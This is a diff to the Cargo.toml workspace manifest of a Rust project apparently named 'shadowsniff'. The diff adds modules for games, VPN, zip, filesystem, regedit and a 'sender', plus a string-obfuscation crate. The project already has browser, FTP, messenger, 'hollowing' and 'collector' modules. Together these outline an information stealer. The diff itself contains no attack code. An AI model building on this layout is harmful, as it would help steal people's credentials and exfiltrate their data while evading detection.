@@ -6,7 +6,6 @@ edition = "2024"
 [workspace]
 resolver = "3"
 members = [
-    "country-emoji",
     "database",
     "ipinfo",
     "json",
@@ -15,10 +14,16 @@ members = [
     "shadowsniff/browsers",
     "shadowsniff/ftp",
     "shadowsniff/messengers",
-    "tasks", 
+    "shadowsniff/games",
+    "shadowsniff/vpn",
+    "tasks",
     "hollowing",
     "utils",
-    "collector"
+    "collector",
+    "zip",
+    "filesystem",
+    "regedit",
+    "sender"
 ]
 
 [profile.release]
@@ -41,3 +46,9 @@ tasks = { path = "tasks" }
 utils = { path = "utils" }
 ipinfo = { path = "ipinfo" }
 collector = { path = "collector" }
+zip = { path = "zip" }
+filesystem = { path = "filesystem" }
+sender = { path = "sender" }
+rand_chacha = { version = "0.9.0", default-features = false }
+rand_core = { version = "0.9.3", default-features = false }
+obfstr = "0.4.4"
